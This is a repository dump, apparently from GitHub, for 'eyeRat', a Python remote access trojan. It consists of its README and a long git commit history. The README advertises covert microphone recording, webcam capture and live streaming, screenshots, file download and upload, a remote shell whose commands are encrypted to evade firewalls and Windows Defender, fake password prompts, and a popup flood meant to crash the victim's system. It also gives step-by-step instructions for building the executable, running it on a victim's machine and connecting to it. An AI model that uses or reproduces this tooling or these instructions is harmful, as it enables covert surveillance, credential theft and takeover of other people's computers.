@@ -1,0 +1,674 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+<p align="center">
+  <img 
+    width="150"
+    height="150"
+    src="https://github.com/AdolfMacro/AdolfMacro/blob/main/logo.png"
+  >
+</p>
+
+
+## EyeRat :shipit:
+
+---
+
+### Contents :
+* [Options](https://github.com/AdolfMacro/eyeRat#options-)
+* [Dependencies](https://github.com/AdolfMacro/eyeRat#dependencies-)
+* [How it works ?](https://github.com/AdolfMacro/eyeRat#how-it-works-)
+  * [General description](https://github.com/AdolfMacro/eyeRat#general-description-)
+  * [Code description](https://github.com/AdolfMacro/eyeRat#code-description-)
+* [What is a MiniRat ?](https://github.com/AdolfMacro/eyeRat#what-is-a-minirat-)
+* [Usage](https://github.com/AdolfMacro/eyeRat#usage-)
+* [Installation(linux)](https://github.com/AdolfMacro/eyeRat#installationlinux-)
+* [General instructions for use](https://github.com/AdolfMacro/eyeRat#general-instructions-for-use)
+* [Screenshots](https://github.com/AdolfMacro/eyeRat#screenshots-)
+* [Upcoming update schedule](https://github.com/AdolfMacro/eyeRat#upcoming-update-schedule--)
+* [Donate](https://github.com/AdolfMacro/eyeRat/#donate-)
+
+---
+
+### Options :
+
+- Voice recording 🎤
+- Take photos 📷
+- Live stream from camera 👀
+- Take screenshot 🖼️
+- File explorer 📁
+- CLI remote command shell 🚀
+- Make custom popup box 📦
+- R/W clipboard 📋
+- Manage multiple RATs 🌱
+- Other ...
+-------
+###  Dependencies :
+#### Libraries :
+- clipboard
+- socket
+- openCV
+- pyaudio
+- pyautogui
+- cryptography
+- pymsgbox
+- Pillow
+- psutil
+- wave
+- colorama
+- pyinstaller
+-------
+### How it works :
+#### General description :
+This program generally has two parts RAT and user side program. Whenever the user has an instruction to send to RAT, the user's application sends a special command to RAT such as: Tpict (to take a photo from the camera). After receiving the command, a function is executed to execute the user command in the victim system. At the same time, a user-side function starts receiving client/server information and displaying or saving it.
+
+#### Code description :
+
+1.Voice recording :
+
+
+Command :
+```
+Rsound
+```
+
+- RAT.recSound(connection):
+First set CHUNK to 1024 and RATE (fs variable) to 44,100 . It then receives the recording time from the client/server . Finally, it opens a stream and saves the frames in a list with a loop and sends the list items that are in bytes.
+
+
+ -  .getSound(connection,time) :
+First, we send the recording time to the client/server (target) through the socket connection ; Then in the current path create a file called Voice.wav and set its [channel](https://www.wildlifeacoustics.com/resources/faqs/what-is-an-audio-channel "channel") to 2 , then we get [sampwidth](https://www.phonetik.uni-muenchen.de/forschung/BITS/TP1/Cookbook/node62.html "sampwidth") from the client/server (target) and finally, we receive and save the recorded audio frames from the target .
+
+
+
+2.Take photos :
+
+
+Command :
+```
+Tpict
+```
+
+- RAT.getPict(connection):
+Reads a frame from camera number 0 using the vid object (cv2.VideoCapture (0)) .Converts it to list from numpy.array and then converts it to str using json.dumps.
+
+- .getPict(connection):
+Receives the frame and converts it to numpy.array and finally saves it to image.jpg.
+
+
+3.Live stream :
+
+
+Command :
+```
+Glive
+```
+
+- RAT.live(connection) :
+Reads frames from camera number 0 using the vid object (cv2.VideoCapture (0)). Converts it from numpy.array to list and then converts it to str using json.dumps and sends them.
+This cycle continues as long as it is connected.
+
+- .getLive(connection) :
+Converts submitted frames to numpy.array and displays them one after the other.
+
+4.Take screenshot :
+
+
+Command :
+```
+Tscr
+```
+
+- RAT.takeScr(connection) :
+Takes a screenshot using pyautogui.screenshot and converts it to numpy.array then converts it to a list finally convert the list to str and send it.
+
+- .getScr(connection) :
+Receives the frame and converts it to numpy.array and finally saves it to screenshot.jpg.
+
+5.File explorer :
+
+
+- Search in current path :
+Searches for current path files.
+
+- Redirect .
+
+-  Current path files :
+List of  current path files (ls OR dir command).
+
+- Edit file :
+Downloads it using the file name and after downloading you have to edit the downloaded file and enter the Enter key to apply the changes.
+
+- Download file .
+
+- Remove file/folder.
+
+- Upload file.
+Uploads a file to the desired system (current path).
+
+
+6.CLI remote command shell :
+
+
+Command :
+```
+RMCM
+```
+
+- What is encryption/decryption key ?
+Execution of remote commands must be encrypted because firewalls and Windows Defender can detect commands and close processes.
+This is why for every RAT that is created, a key is needed to decrypt / encrypt it.
+
+
+**NOTE** : Try not to enter commands that cause the program to crash, for example: Commands that ask the user to enter something and such commands.
+
+7.Make custom popup box :
+
+
+
+- Alert window:
+Display a window with OK and Cancel buttons
+
+- Confirm window :
+A window to receive confirmation from the user.
+
+- Question window
+Ability to ask multiple choice questions (buttons) from the user.
+
+- Password window :
+A window to get the password from the user .
+
+8.Other :
+
+
+- Fun hacked alert :
+
+
+Command :
+```
+HDalert
+```
+This section receives a photo from the user and sends it to the client/server (target) (like the frame sending methods described earlier).
+The RAT then opens the image 1000 times in different windows and the victim system crashes.
+
+- Target system info :
+Receives and displays some victim system information.
+
+-------
+
+### What is a MiniRat ?
+
+Due to the large size of the rat.py file in version v1.1.1, I decided to split the rat.py file into smaller sections and consider a launcher for each one separately (the size of these rats has been reduced to 20M).
+
+When you enter the 5 tools section (mini-rat section), you will enter the mini-rats menu by selecting the first option.
+
+In this menu, you will see the following options :
+
+
+SpyRat : By selecting this option, you will enter a submenu that lists small rats that have spy mode. You can select and generate one according to your needs.
+
+CMD rat : This rat only performs the Remote command shell operation .
+
+PoPuP rat : This rat only allows you to create PoPuP windows
+
+Fun Rat : Allows you to access options such as fun hacked alert and target system info.
+
+-------
+### Usage :
+```
+git clone https://github.com/AdolfMacro/eyeRat.git
+cd eyeRat
+python3 eyeRat.py
+```
+------
+
+### Installation(linux) :
+#### How to install on **Linux**:
+```
+git clone https://github.com/AdolfMacro/eyeRat.git
+cd eyeRat/tools/
+bash installer.sh
+```
+**Please run with normal user (do not run with root user)**
+
+-------
+
+### General instructions for use:
+
+You must first obtain the victims IP address.
+Then you have to create an executable file (depending on the type of your operating system) using the generator option.
+Finally, the executable file must be executed on the target system.
+Now you need to go to the client launcher section and enter the IP address and port
+Now the usage menu and commands open, you can use them according to your needs.
+
+In version 1.0.0, there is no need to find the victim's IP and the tool can also be used as a reverse connection.
+
+--------
+### Screenshots :
+![menu1](https://github.com/AdolfMacro/eyeRat/blob/main/screenshots/1.png?raw=true)
+
+
+![menu2](https://github.com/AdolfMacro/eyeRat/blob/main/screenshots/2.jpg?raw=true)
+
+
+![menu3](https://github.com/AdolfMacro/eyeRat/blob/main/screenshots/3.jpg?raw=true)
+
+
+![menu4](https://github.com/AdolfMacro/eyeRat/blob/main/screenshots/4.png?raw=true)
+
+
+![menu5](https://github.com/AdolfMacro/eyeRat/blob/main/screenshots/5.png?raw=true)
+
+![menu6](https://github.com/AdolfMacro/eyeRat/blob/main/screenshots/6.png?raw=true)
+--------
+
+#### Upcoming update schedule 🌱 :
+
+- [ ] **UDP connection .**
+
+- [ ] **Code optimization .**
+
+- **And  ...**
+
+
+------
+
+### Donate :
+
+<p>
+  <img 
+    width="130"
+    height="25"
+    src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Bitcoin_logo.svg/1920px-Bitcoin_logo.svg.png"
+  >
+</p>
+
+BTC : bc1qyfargh3pvfuj8dha0a3nlcdc9qu08wr2ymuvls
+
+
+<p>
+  <img 
+    width="130"
+    height="35"
+    src="https://magazine4you.ir/en/wp-content/uploads/2022/04/ethereum-logo-long.png"
+  >
+</p>
+
+ETH : 0xD96CEdf36bA9E71C1dbc63eD3Ae3749226978d18
+
+<p>
+  <img 
+    width="130"
+    height="35"
+    src="https://www.nicepng.com/png/full/308-3087899_banner2-dogecoin-the-ultimate-beginners-guide-for-understanding.png"
+  >
+</p>
+
+Dogecoin : DGYnqWEEyhSkeeHtxWsZiSgPxBVsaS6eJm
+
+------
+
+> The use of the eyeRat(all versions) COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program.
+====================== GIT HISTORY: ======================
+a412438 HEAD@{0}: clone: from https://github.com/AdolfMacro/eyeRat
+commit a412438832ae90945744f25e66f17235af958595
+Author: AdolfMacro <m4nikamrna@gmail.com>
+Date:   Sat Oct 8 21:28:34 2022 +0300
+
+    My msg :(
+
+commit b40969bf2f66e20c9e28fde5a761de2c68cbed49
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Tue Jul 5 13:47:18 2022 +0430
+
+    Update VERSION.txt
+
+commit 6eddff54f410cdf297d595ec01150b321d7ec787
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Tue Jul 5 13:46:49 2022 +0430
+
+    Update generator.py
+
+commit b77a2a1328cbb6703ec8b64efe5238c571f94d52
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Sun Jun 12 20:34:13 2022 +0430
+
+    Update README.md
+
+commit 3a3fc17710e13b3f74af09196afbbfdf3e678532
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Sun Jun 12 20:32:17 2022 +0430
+
+    Update README.md
+
+commit 2cd327a6638aa0756cb0f02b6a0a3cf721749e2c
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Tue Jun 7 12:36:40 2022 +0430
+
+    Update README.md
+
+commit 41f81b79c943f1e750d507044d4a81b8fe2ce260
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Tue Jun 7 12:28:56 2022 +0430
+
+    Update README.md
+
+commit fbb84f050b80da9e6f2e5c4f7061a2fa5a488f78
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Sat May 14 18:14:35 2022 +0430
+
+    Update README.md
+
+commit d04a9744f6e429c9c79675961bf84d89bd032fe0
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Tue May 10 19:27:00 2022 +0430
+
+    Add files via upload
+
+commit 906dae3230dea7da2ddb4dad4fd6e155c5e40357
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Tue May 10 19:26:11 2022 +0430
+
+    Delete 1.png
+
+commit f3f5a4a3cfdf6d4d1f3b9d342dcfb22b10acb27d
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Tue May 10 15:35:25 2022 +0430
+
+    Update README.md
+
+commit 2ae421eb02a73621d62a931396e07b9d7e48399e
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Tue May 10 15:22:24 2022 +0430
+
+    Add files via upload
+    
+    MiniRat menu screenshot ...
+
+commit 7e9daaec7035d52f0bbce3d0861b8ed3e305b2da
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Tue May 10 15:16:04 2022 +0430
+
+    Added MiniRat capability : 1.1.1:0
+
+commit f44c6462bbe45caac900275f826f9ecb6274b428
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Fri May 6 14:49:18 2022 +0430
+
+    Update README.md
+
+commit 57e134a5c99f19603857a9a49894c37e53014e10
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Wed May 4 14:31:34 2022 +0430
+
+    Fix file explorer bug : 1.1.0:1
+
+commit 7e664e6c38846ba833ae7cae69917a7d3cc75af6
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Mon May 2 12:51:41 2022 +0430
+
+    Update README.md
+
+commit 8487f824db5420ea21344a85edc8f575c0c06282
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Mon May 2 12:49:55 2022 +0430
+
+    Add files via upload
+
+commit 5008eaf348c5e158a49c3403d8abf9b9659316f3
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Fri Apr 29 19:36:39 2022 +0430
+
+    Update README.md
+
+commit a3db847b5ffcd820cc83bb94c26e00528da5158b
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Fri Apr 29 19:06:58 2022 +0430
+
+    Update to 1.1.0:0
+
+commit 4f554870150a127710b56f47438bc68db90dc987
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Mon Apr 25 00:25:22 2022 +0430
+
+    Update README.md
+
+commit acf806ce399a38aa11cea84566b37dd0e29bec63
+Merge: cc09fb7 19a5409
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Mon Apr 25 00:23:19 2022 +0430
+
+    Merge pull request #2 from xdevman/main
+    
+    pyinstaller module
+
+commit 19a5409ada6978768b5b67d0b037b1bb55f49608
+Author: sobhan shokri <xd3vman@gmail.com>
+Date:   Sun Apr 24 21:16:33 2022 +0430
+
+    delete cache files
+
+commit bb79df447f198064b7a62acc27f3573a3fdd8af7
+Author: sobhan shokri <xd3vman@gmail.com>
+Date:   Sun Apr 24 20:54:12 2022 +0430
+
+    add module
+    
+    pyinstaller module for convert  to exe
+
+commit 6d7668151aac5d2e774fef6b38ccdf18cd0f201e
+Author: sobhan shokri <xd3vman@gmail.com>
+Date:   Sun Apr 24 20:25:14 2022 +0430
+
+    fix module
+    
+    remove pyaudio
+
+commit cc09fb7cfce9680cd16758fffac3ae4d987f817a
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Sat Apr 23 22:46:00 2022 +0430
+
+    Update README.md
+
+commit ea52e7a729da8600e3778d3935a7d695507429be
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Sat Apr 23 22:42:29 2022 +0430
+
+    Update README.md
+
+commit 8472b8f5b7998dcf5685fe45894a8c5140ece9bc
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Wed Apr 20 22:16:02 2022 +0430
+
+    Update screenshots
+
+commit 9b0035693c86cd607fe1fe5acc63f22223f31c39
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Mon Apr 18 16:04:48 2022 +0430
+
+    UP
+
+commit 0546ed654637e2219f50e519f1d85208d2c8e3bf
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Mon Apr 18 16:01:07 2022 +0430
+
+    UP
+
+commit bd1c7634a92bdb14766f45349c6ccfc44b065797
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Mon Apr 18 00:55:38 2022 +0430
+
+    add updater
+
+commit e84bad6f2b4a3efd77dcc1c6787f299014d7b53c
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Mon Apr 18 00:22:09 2022 +0430
+
+    add updater
+
+commit 9d47e17e4351b7cc7d7d51899324aad12bad7772
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Mon Apr 18 00:09:50 2022 +0430
+
+    add updater
+
+commit 8873a83ce3eac82fbba60e88aa0495a804e57864
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Sun Apr 17 18:51:03 2022 +0430
+
+    Update README.md
+
+commit 835e28a959ccd02bc5693ac61ace34345441a693
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Sun Apr 17 18:44:46 2022 +0430
+
+    UP
+
+commit 6c65db5a4501561f470640939fb7ad05b04f3c0f
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Mon Apr 11 15:40:45 2022 +0430
+
+    Update README.md
+
+commit 02704b81af84e65bddc09b012101ab3535e05c54
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Wed Apr 6 22:58:26 2022 +0430
+
+    Update README.md
+
+commit 1ae73cc2f6590e83f6b2649f6da566d0732bd36f
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Mon Apr 4 02:56:28 2022 +0430
+
+    Update README.md
+
+commit f67aca3587d0b24a7520080eee66c1529bb1c37c
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Mon Apr 4 02:42:38 2022 +0430
+
+    Update README.md
+
+commit f15991484d50b0de0a212ab9e9e0fbf6dced2a4b
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Mon Apr 4 02:41:31 2022 +0430
+
+    Add files via upload
+
+commit 0e45bc569e1eade52e3f7c66f9fe1742dd0e8513
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Mon Apr 4 02:41:09 2022 +0430
+
+    Delete 3jpg
+
+commit a421165e9ec1d6c3cbc03edf533d092234103ffb
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Mon Apr 4 02:33:53 2022 +0430
+
+    Up
+
+commit be74219f39accbcda5291bbb5b5261709be30137
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Mon Apr 4 02:33:18 2022 +0430
+
+    Up
+
+commit 9f365f0d57c330ee7e2f7bbe57675b74b828865f
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Sat Apr 2 15:26:11 2022 +0430
+
+    update 1.0.1
+
+commit 1ea5a3189a29eea52a0bf48bc2354d5efedb86ef
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Sat Apr 2 13:17:32 2022 +0430
+
+    Update README.md
+
+commit cbb593b823d414db0200a29abeb7fecf8b23281c
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Sat Apr 2 13:08:13 2022 +0430
+
+    Update README.md
+
+commit e1cfc191b644c54157880c883f179de3a5cf2edc
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Fri Mar 25 15:38:40 2022 +0430
+
+    Update README.md
+
+commit 166a19984d569baba4e3ec31fec82fc7382cc080
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Fri Mar 25 15:32:18 2022 +0430
+
+    Update
+
+commit 562a727d8e527ced4223613628dbcd6bfec251bc
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Wed Mar 23 19:55:38 2022 +0430
+
+    Update README.md
+
+commit a0284bd6faac4836ce30221e1934adb216ae7a52
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Fri Mar 18 14:21:00 2022 +0330
+
+    Update README.md
+
+commit 8e1b7b7537463f965a012582833c49c4584c62bb
+Author: adolfmacro <m4nikamran@gmail.com>
+Date:   Fri Mar 18 14:11:27 2022 +0330
+
+    Update to 1.0.0
+
+commit d073ae76a754df75b488001295a3d9a7302bbc7f
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Wed Mar 9 14:39:33 2022 +0330
+
+    I decided not to add a GUI
+
+commit 4d5fcd3b58b39c845d5639f74be9a2f91db14f29
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Fri Mar 4 19:22:23 2022 +0330
+
+    Update README.md
+
+commit 60215ece1f314f87efa7e10842858d046f206156
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Fri Mar 4 19:18:22 2022 +0330
+
+    Update README.md
+
+commit 4db350f7508c576fa3936800e0f63d6d2ccd00d4
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Fri Mar 4 19:14:28 2022 +0330
+
+    Update README.md
+
+commit bf91226d79881823c838898885463decaf94ba52
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Fri Mar 4 19:13:57 2022 +0330
+
+    Update README.md
+
+commit 8c8ff55ea1aea171bbacf4cdbd4c5e57ad32b796
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Fri Mar 4 19:13:34 2022 +0330
+
+    Add files via upload
+
+commit 64aeea4baea64e8bf9bea281eabfa74211c8f569
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Fri Mar 4 17:28:52 2022 +0330
+
+    Update eyeRat.py
+
+commit 760e1bc3b8299b21a5bc066143fd4f01f561249e
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Fri Mar 4 14:11:38 2022 +0330
+
+    Add files via upload
+
+commit eedc51fd1520fd659b82206c5e649403362312f1
+Author: Adolf Macro <87756378+AdolfMacro@users.noreply.github.com>
+Date:   Fri Mar 4 14:04:50 2022 +0330
+
+    Initial commit
